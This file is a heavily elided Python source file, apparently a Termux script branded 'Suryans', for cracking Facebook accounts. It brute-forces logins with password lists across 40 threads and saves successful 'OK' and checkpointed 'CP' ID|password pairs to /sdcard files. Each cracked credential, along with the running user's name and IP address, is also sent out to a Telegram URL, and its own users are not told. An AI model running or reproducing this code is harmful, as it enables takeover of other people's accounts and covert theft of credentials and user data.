...
# CODER FROM Suryans
# SAY THE NAME THE Suryans THE CODERR
# JAI Suryans , Suryans BOLKE KAM MAT SAMAJNA TERA BAP HE Suryans
...
\033[1;37m-------------------------------------------
\33[1;93m  Github : Dadabrand
\33[1;93m  Facebook : Suryans Gori
\33[1;93m WELCOME  TO  Suryans  WORLD
 CREATED  BY  ONE  AND  ONLY  Suryans-Xd
\033[1;37m-------------------------------------------""")
...
id=[]
tokenku=[]
sys.stdout.write('\x1b]2; Suryans THE LORD\x07')
...
def contact():
    ...
    admin = input(" CHOOSE : ")
    if admin in ['1']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100082240227055&mibextid=ZbWKwL')
        back
    elif admin in ['2']:
        linex()
        message = input(' [\u001b[36m•\033[1;37m] ENTER YOUR MESSAGE : ')
        requests.get("https://t.me/prasshantboot1233&text=" + "NAME : " + username + "\nMESSAGE : " + message + "")
        linex()
...
pass
requests.get("https://t.me/prasshantboot1233&text=THIS USER IS USING V5\nNAME : " + username + "\nIP ADDRESS : " + ip )
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=40) as crack_submit:
                                        ...
                                        print(" \033[1;37m[\u001b[36m•\033[1;37m] USE 4G NTC MOBILE DATA FOR SPEED UP")
                                        linex()
                                        for user in fo:
                                ...
                                if cpok in ['1','01']:
                                    clear()
                                    open('/sdcard/Suryans-OK.txt', 'a')
                                    animation(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING OK IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/Suryans-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    clear()
                                    open('/sdcard/Suryans-CP.txt', 'a')
                                    print(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING CP IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/Suryans-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m \33[1;92m[Suryans-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Suryans=session.cookies.get_dict().keys()
                        if "c_user" in Suryans:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [Suryans-OK] %s | %s'%(ids,pas))
                                print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                open('/sdcard/Suryans-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                requests.get("https://t.me/prasshantboot1233&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                requests.get("https://t.me/prasshantboot1233&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Suryans:
                                if 'y' in pcp:
                                        print('\r\r\x1b\033[1;33m \33[1;93m[Suryans-CP] '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/Suryans-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Suryans-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Suryans-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/Suryans-OK.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("https://t.me/prasshantboot1233&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[\033[1;33m [Suryans-CP] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/Suryans-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Suryans-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Suryans-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                                        open('/sdcard/Suryans-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        requests.get("https://t.me/prasshantboot1233&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        requests.get("https://t.me/prasshantboot1233&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        oks.append(ids)
                                                        break
